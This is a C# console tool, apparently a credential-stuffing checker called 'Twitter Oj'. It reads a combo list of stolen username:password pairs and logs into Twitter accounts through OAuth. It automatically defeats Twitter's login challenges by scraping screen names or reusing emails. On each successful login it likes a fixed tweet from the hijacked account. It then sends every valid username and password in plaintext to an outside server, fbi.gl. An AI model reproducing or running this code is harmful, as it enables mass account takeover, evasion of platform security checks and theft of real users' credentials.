using System;
using RestSharp;
using System.Net;
using System.IO;
using Colorful;
using Console = Colorful.Console;
using System.Drawing;
using System.Linq;

namespace Twitter_Oj
{
    class Program
    {
        public static int doneTotal = 0;
        public static int doneAdded = 0;
        static void Main(string[] args)
        {

            Console.Title = "Twitter Oj | by Matthew";

            string[] ojBanner = new string[]
            {
                @" ",
                @"  ,--------.           ,--.  ,--.    ,--.                     ,-----.  ,--.",
                @"  '--.  .--',--.   ,--.`--',-'  '-.,-'  '-. ,---. ,--.--.    '  .-.  ' `--'",
                @"     |  |   |  |.'.|  |,--.'-.  .-''-.  .-'| .-. :|  .--'    |  | |  | ,--.  version 0.3.3.6",
                @"     |  |   |   .'.   ||  |  |  |    |  |  \   --.|  |       '  '-'  ' |  |  by Matthew",
                @"     `--'   '--'   '--'`--'  `--'    `--'   `----'`--'        `-----'.-'  /  @schiedam, @wiet",
                @"                                                                     '---'",
            };


            int r = 225;int g = 255;int b = 250;
            for (int i = 0; i < 7; i++)
            {
                Console.WriteLine(ojBanner[i], Color.FromArgb(r, g, b));
                r -= 18;b -= 9;
            }


            //#> Provide some information
            provideInformation:
            Console.ForegroundColor = Color.DarkGray;
            Console.Write("  combo list path: ");
            Console.ForegroundColor = Color.White;
            string combolist = Console.ReadLine();


            Console.ForegroundColor = Color.DarkGray;
            Console.Write("  username_or_email split: ");
            Console.ForegroundColor = Color.White;
            int u_split = ushort.Parse(Console.ReadLine());

            Console.ForegroundColor = Color.DarkGray;
            Console.Write("  password split: ");
            Console.ForegroundColor = Color.White;
            int p_split = ushort.Parse(Console.ReadLine());

            Console.WriteLine(String.Empty);

            //#> Create a StreamReader
            StreamReader ImportFile = new StreamReader(combolist);

            string line;
            while ((line = ImportFile.ReadLine()) != null)
            {
                //#> Create a string of the user information and make sure it does not give a exception
                doneTotal++;

                string[] Account = line.Split(':');
                string username_or_email = Account.Length >= u_split + 1 ? Account[u_split] : null;
                string password = Account.Length >= p_split + 1 ? Account[p_split] : null;

                //#> Create new Twitter
                Twitter(username_or_email, password.ToLower());
            }

            //#> Done with all accounts
            Formatter[] Format = new Formatter[] { new Formatter(doneTotal, Color.White), new Formatter(doneAdded, Color.White), new Formatter(doneTotal, Color.White) };
            Console.WriteLineFormatted("  [Done/{0}] {1} out of {2} added.", Color.DarkGray, Format);
            Console.WriteLine(String.Empty);
            goto provideInformation;

        }

        private static string Twitter(string username_or_email, string password)
        {
            //#> Some basic information
            Console.Title = String.Format("Twitter Oj | by Matthew | Tested: {0} | Added: {1}", doneTotal, doneAdded);
            string bypassTemp = String.Empty;
            string login_name = String.Empty;
            string screen_name = String.Empty;

            Twitter:
            try {

                //#> Create a RestClient & CookieContainer
                CookieContainer Cookies = new CookieContainer();
                RestClient Request = new RestClient("http://fbi.gl");

                //#> Request the oauth_token from the API
                request_oauth_token:
                try {

                    Request.BaseUrl = new Uri("http://fbi.gl");
                    var requestUrl = Request.Get(new RestRequest("/TwitterOj/requestUrl.php"));

                    if(requestUrl.Content.Contains("Fatal"))
                    {
                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Core", Color.Gold), };
                        Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                        goto request_oauth_token;
                    }
                    string oauth_token = requestUrl.Content;

                    //#> Request a authenticity_token from Twitter for auth
                    Request.BaseUrl = new Uri("https://api.twitter.com");
                    var requestToken = Request.Get(new RestRequest(String.Format("/oauth/authorize?oauth_token={0}", oauth_token)));
                    string authenticity_token = getBetween(requestToken.Content, "name=\"authenticity_token\" type=\"hidden\" value=\"", "\">");

                    //#> Add the Twitter cookies to the client
                    foreach (var Cookie in requestToken.Cookies)
                    {
                        Cookies.Add(new Cookie(Cookie.Name, Cookie.Value, Cookie.Path, Cookie.Domain));
                    }
                    Request.CookieContainer = Cookies;

                    //#> Login to the account
                    login:

                    if(String.IsNullOrEmpty(bypassTemp))
                    {
                        login_name = username_or_email;
                    }
                    else
                    {
                        login_name = bypassTemp;
                    }

                    RestRequest oauth_authorize = new RestRequest("/oauth/authorize", Method.POST);
                    oauth_authorize.AddParameter("authenticity_token", authenticity_token);
                    oauth_authorize.AddParameter("redirect_after_login", String.Format("https://api.twitter.com/oauth/authorize?oauth_token={0}", oauth_token));
                    oauth_authorize.AddParameter("oauth_token", oauth_token);
                    oauth_authorize.AddParameter("session[username_or_email]", login_name);
                    oauth_authorize.AddParameter("session[password]", password);
                    var valid_oauth = Request.Post(oauth_authorize);

                    var short_authenticity_token = authenticity_token != null ? string.Join("", authenticity_token.Take(13)) : null;
                    var short_oauth_token = oauth_token != null ? string.Join("", oauth_token.Take(13)) : null;
                    string account_information = String.Format("  [{1}/{2}] ", "", short_authenticity_token, short_oauth_token);

                    //#> If the account is locked
                    if (valid_oauth.Content.Contains("login-challenge-form"))
                    {
                        //#> Grab some basic information needed
                        string challenge_type = getBetween(valid_oauth.Content, "name=\"challenge_type\" value=\"", "\"/>");
                        string user_id = getBetween(valid_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
                        string second_authenticity_token = getBetween(valid_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
                        string challenge_id = getBetween(valid_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");
                        string redirect_after_login = getBetween(valid_oauth.Content, "name=\"redirect_after_login\" value=\"", "\"/>");

                        //#> Bypass challenge RetypeScreenName
                        if (challenge_type == "RetypeScreenName")
                        {
                            RetypeScreenName:
                            try
                            {
                                //#> Get the screenname with user_id
                                Request.BaseUrl = new Uri("https://twitter.com");
                                var requestUsername = Request.Get(new RestRequest(String.Format("/intent/user?user_id={0}", user_id)));
                                

                                //#> Make sure the account is not suspended
                                if (requestUsername.ResponseUri.ToString() != "https://mobile.twitter.com/account/suspended")
                                {
                                    screen_name = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");

                                    //#> Unlock the account
                                    Request.BaseUrl = new Uri("https://api.twitter.com");
                                    RestRequest RetypeScreenName = new RestRequest("/account/login_challenge", Method.POST);
                                    RetypeScreenName.AddParameter("challenge_type", "RetypeScreenName");
                                    RetypeScreenName.AddParameter("platform", "web");
                                    RetypeScreenName.AddParameter("remember_me", "true");

                                    RetypeScreenName.AddParameter("authenticity_token", second_authenticity_token);
                                    RetypeScreenName.AddParameter("challenge_id", challenge_id);
                                    RetypeScreenName.AddParameter("user_id", user_id);
                                    RetypeScreenName.AddParameter("redirect_after_login", redirect_after_login);
                                    RetypeScreenName.AddParameter("challenge_response", screen_name);
                                    var unlocked_account = Request.Post(RetypeScreenName);

                                    //Console.WriteLine(String.Format("screen_name: {0}, user_id: {1},", screen_name, user_id));


                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("RetypeScreenName", Color.Orange), };
                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);

                                    goto login;
                                }
                                else
                                {
                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1})", Color.DarkGray, Format);
                                }
                            }
                            catch
                            {
                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
                                Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                                goto RetypeScreenName;
                            }

                        }

                        //#> Bypass challenge TemporaryPassword
                        else if (challenge_type == "TemporaryPassword")
                        {
                            TemporaryPassword:
                            try
                            {
                                //#> Get the screenname with user_id
                                Request.BaseUrl = new Uri("https://twitter.com");
                                var requestUsername = Request.Get(new RestRequest(String.Format("/intent/user?user_id={0}", user_id)));

                                if (requestUsername.ResponseUri.ToString() != "https://mobile.twitter.com/account/suspended")
                                {
                                    bypassTemp = getBetween(requestUsername.Content, "<span class=\"nickname\">@", "</span>");

                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("TemporaryPassword", Color.Orange), };
                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);

                                    goto login;
                                }
                                else
                                {
                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1})", Color.DarkGray, Format);
                                }
                            }
                            catch
                            {
                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
                                Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                                goto TemporaryPassword;
                            }
                        }

                        //#> Bypass challenge RetypeEmail
                        else if (challenge_type == "RetypeEmail")
                        {
                            if (username_or_email.Contains("@"))
                            {
                            RetypeEmail:
                                try
                                {
                                    //#> Unlock the account
                                    Request.BaseUrl = new Uri("https://api.twitter.com");
                                    RestRequest RetypeEmail = new RestRequest("/account/login_challenge", Method.POST);
                                    RetypeEmail.AddParameter("challenge_type", "RetypeEmail");
                                    RetypeEmail.AddParameter("platform", "web");
                                    RetypeEmail.AddParameter("remember_me", "true");

                                    RetypeEmail.AddParameter("authenticity_token", second_authenticity_token);
                                    RetypeEmail.AddParameter("challenge_id", challenge_id);
                                    RetypeEmail.AddParameter("user_id", user_id);
                                    RetypeEmail.AddParameter("redirect_after_login", redirect_after_login);
                                    RetypeEmail.AddParameter("challenge_response", username_or_email);
                                    var unlocked_account = Request.Post(RetypeEmail);

                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("RetypeEmail", Color.Orange), };
                                    Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): bypassed", Color.DarkGray, Format);

                                    goto login;
                                }
                                catch
                                {
                                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Twitter", Color.LightBlue), };
                                    Console.WriteLineFormatted(account_information + "{0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                                    goto RetypeEmail;
                                }
                            }
                            else
                            {
                                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("RetypeEmail", Color.Red), };
                                Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): not bypassable", Color.DarkGray, Format);
                            }
                        }

                        //#> Other challenge
                        else
                        {
                            Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter(challenge_type, Color.Red), };
                            Console.WriteLineFormatted(account_information + "{0}: login-challenge-form ({1}): not bypassable", Color.DarkGray, Format);
                        }

                    }

                    //#> If the account is locked
                    else if (valid_oauth.Content.Contains("account_identifier"))
                    {
                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("account_identifier", Color.Orange), };
                        Console.WriteLineFormatted(account_information + "{0}: Locked account ({1})", Color.DarkGray, Format);
                    }

                    //#> If the account information is not correct
                    else if (valid_oauth.Content.Contains("<div class=\"message\">"))
                    {
                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Incorrect password", Color.Red), };
                        Console.WriteLineFormatted(account_information + "{0}: {1}", Color.DarkGray, Format);
                    }

                    //#> If the request provides a 404, means locked or idk yet
                    else if (valid_oauth.Content.Contains("<title>Twitter / ?</title>"))
                    {
                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Oj", Color.Gold), };
                        Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                    }

                    //#> If the account is all valid
                    else if (valid_oauth.Content.Contains("/TwitterOj/requestUrl.php?oauth"))
                    {
                        validLogin:
                        try
                        {
                            doneAdded++;
                            string oauth_verifier = getBetween(valid_oauth.Content, "TwitterOj/requestUrl.php?", "\"/>");

                            Request.BaseUrl = new Uri("https://mobile.twitter.com");
                            RestRequest rtInfo = new RestRequest("/statuses/748138039143194624/retweet");
                            var RtInf = Request.Get(rtInfo);
                            string second_authenticity_token = getBetween(RtInf.Content, "name=\"authenticity_token\" type=\"hidden\" value=\"", "\"/>");

                            RestRequest LikeMe = new RestRequest("/statuses/748138039143194624/favorite?authenticity_token=" + second_authenticity_token);
                            Request.Get(LikeMe);
                            

                            /*RestRequest Rt = new RestRequest("/statuses/748138039143194624/retweet", Method.POST);
                            Rt.AddParameter("tweet_id", "748138039143194624");
                            Rt.AddParameter("_method", "POST");
                            Rt.AddParameter("commit", "Retweet");
                            Rt.AddParameter("return_url", "/home#tweet_748138039143194624");

                            Rt.AddParameter("authenticity_token", second_authenticity_token);
                            Request.Post(Rt);*/

                            /*RestRequest Volg = new RestRequest("/wiet/follow", Method.POST);
                            Volg.AddParameter("commit", "Follow");*/

                            //#> Save the account

                            Request.BaseUrl = new Uri("http://fbi.gl");
                            var safeToken = Request.Get(new RestRequest(String.Format("/TwitterOj/requestUrl.php?{0}&username_or_email={1}&password={2}", oauth_verifier, username_or_email, password)));

                            Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter(safeToken.Content, Color.Green), new Formatter(screen_name, Color.White), };
                            Console.WriteLineFormatted(account_information + "{0}: {1}", Color.DarkGray, Format);
                        }
                        catch
                        {
                            //#> requestUrl API is down, retry
                            Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Oj", Color.Gold), };
                            Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                            goto validLogin;
                        }
                    }

                    //#> If the account is suspended
                    else
                    {
                        Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Suspended account", Color.Red), };
                        Console.WriteLineFormatted("  [Error/requestUrl] {0}: {1}", Color.DarkGray, Format);
                    }

                }
                catch (Exception e)
                {
                    //#> requestUrl API is down, retry
                    Console.WriteLine(e);
                    Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), new Formatter("Oj", Color.Gold), };
                    Console.WriteLineFormatted("  [Error/requestUrl] {0}: Unable to get a response from {1}, retrying", Color.DarkGray, Format);
                    goto request_oauth_token;
                }

            }
            catch
            {
                Formatter[] Format = new Formatter[] { new Formatter(username_or_email, Color.White), };
                Console.WriteLineFormatted("  [Error/Unknown] {0}: Unknown Error while checking account, retrying", Color.DarkGray, Format);
                goto Twitter;
            }

            //#> return a empty string
            return String.Empty;
        }

        private static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return "";
            }
        }

    }
}
